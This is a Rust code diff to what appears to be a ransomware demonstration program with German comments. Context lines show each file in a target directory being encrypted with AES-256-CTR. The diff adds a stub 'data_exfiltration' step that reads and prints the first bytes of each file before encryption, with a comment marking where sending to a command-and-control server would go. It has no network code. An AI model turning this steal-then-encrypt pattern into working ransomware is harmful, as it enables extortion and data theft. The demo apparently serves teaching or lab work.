@@ -33,6 +33,33 @@ fn key_generate_and_save(base_path: &Path) -> Result<[u8; 32]> {
     Ok(key)
 }
 
+fn read_file_contents(path: &Path) -> Result<Vec<u8>> {
+    let preview_size = 128;
+    let mut file = File::open(path)?;
+
+    let mut buffer = vec![0u8; preview_size];
+
+    let count = file.read(&mut buffer)?;
+
+    buffer.truncate(count);
+
+    Ok(buffer)
+}
+
+fn data_exfiltration(path: &Path) -> Result<()> {
+    let file_content = read_file_contents(path)?;
+
+    if let Ok(text) = String::from_utf8(file_content.clone()) {
+        println!("    [UPLOAD] Inhalt: {}", text);
+    } else {
+        println!("    [UPLOAD] Binärdaten: {:02X?}", file_content);
+    }
+
+    // Content an C2-Server senden
+
+    Ok(())
+}
+
 /// Verschlüsselt eine Datei mit AES-256-CTR
 ///
 /// Funktion nutzt Streaming (puffer), damit auch große Dateien speicherschonend verarbeitet werden
@@ -115,6 +142,11 @@ pub fn run_malware_demo(target_dir: &str) -> Result<()> {
 
         if path.ends_with("rescue.key") || path.extension().map_or(false, |ext| ext == "locked") {
             continue;
+        }
+
+        match data_exfiltration(&path) {
+            Ok(_) => {}
+            Err(e) => eprintln!(" [!] Fehler beim versenden der Daten {:?}: {}", path, e),
         }
 
         match encrypt_file_safe(path, &key, &iv) {
